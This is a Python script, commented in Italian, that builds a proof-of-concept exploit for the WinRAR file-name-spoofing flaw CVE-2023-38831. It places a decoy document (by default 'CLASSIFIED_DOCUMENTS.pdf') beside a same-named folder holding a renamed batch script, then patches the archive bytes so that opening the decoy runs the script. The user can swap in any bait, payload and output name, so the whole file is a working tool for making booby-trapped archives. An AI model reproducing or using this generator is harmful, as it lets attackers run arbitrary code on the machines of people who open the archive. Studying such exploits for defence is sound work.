'''
Created Date: Monday, August 28th 2023, 12:26:03
Author: Paolo Lazzaroni

Last Modified: Monday, August 28th 2023, 12:28:55
Modified By: Paolo Lazzaroni

Copyright (c) 2023

HISTORY:
Date      	By	Comments
----------	--	--------
'''
import shutil
import os, sys
from os.path import join
TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"

BAIT_NAME = "CLASSIFIED_DOCUMENTS.pdf"
SCRIPT_NAME = "script.bat"

if len(sys.argv) > 3:
    BAIT_NAME = os.path.basename(sys.argv[1])
    SCRIPT_NAME = os.path.basename(sys.argv[2])
    OUTPUT_NAME = os.path.basename(sys.argv[3])
elif len(sys.argv) == 2 and sys.argv[1] == "poc":
    pass
else:
    print("""Usage:
          python .\cve-2023-38831-exp-gen.py poc
          python .\cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <OUTPUT_NAME>""")
    sys.exit()

BAIT_EXT = b"." + bytes(BAIT_NAME.split(".")[-1], "utf-8")

print("BAIT_NAME:", BAIT_NAME)
print("SCRIPT_NAME:", SCRIPT_NAME)
print("OUTPUT_NAME:", OUTPUT_NAME)

if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)
os.mkdir(TEMPLATE_NAME)

# Creo una cartella con lo stesso nome del file safe
d = join(TEMPLATE_NAME, BAIT_NAME + "A") 
if not os.path.exists(d):
    os.mkdir(d)

# Copio lo script malicious nella cartella creata prima, rinominandolo come il file safe
# così da avere 
# └──FILE_SAFE.pdfA
#    └──FILE_SAFE.pdfA.cmd
# dove FILE_SAFE.pdfA.cmd è lo script malicious
shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME+"A.cmd"))

# Copio il file safe nella cartella root
# ├──FILE_SAFE.pdfA
# │  └──FILE_SAFE.pdfA.cmd
# └──FILE_SAFE.pdfB
# dove FILE_SAFE.pdfB è il file safe
shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME+"B"))

# if os.path.exists(OUTPUT_NAME):
#     print("!!! dir %s exists, delete it first" %(OUTPUT_NAME))
#     sys.exit()

# Creo l'archivio zip
shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

# Apro l'archivio zip e sostituisco i caratteri nei nomi A e B con uno spazio
# così da avere 
# ├──FILE_SAFE.pdf 
# │  └──FILE_SAFE.pdf .cmd
# └──FILE_SAFE.pdf 
# La cartella e il file safe hanno lo stesso nome!!
# Probabilmente WinRAR non gestisce bene questa situazione ed esegue lo script dentro la cartella
with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
    content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

# Rimuovo l'archivio zip
os.remove(TEMPLATE_NAME + ".zip")

# Scrivo l'esatto contenuto (dopo la modifica) dell'archivio zip in un file con estensione .rar
with open(OUTPUT_NAME, "wb")  as f:
    f.write(content)

print("ok..")
